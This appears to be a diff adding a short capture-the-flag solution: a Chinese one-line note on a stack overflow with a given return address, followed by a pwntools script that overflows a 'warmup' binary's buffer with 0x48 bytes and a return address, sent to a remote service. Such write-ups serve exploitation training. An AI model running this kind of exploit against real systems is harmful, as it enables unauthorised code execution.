@@ -1,0 +1,10 @@
+栈溢出，给了返回的位置
+
+from pwn import *
+payload = "a"*0x48+p64(0x40060d)
+p = remote("111.198.29.45",35560)
+#p = process("./warmup")
+#gdb.attach(p, "b * 0x4006a4")
+p.recvuntil("-Warm Up-\nWOW:0x40060d\n>")
+p.sendline(payload)
+p.interactive()
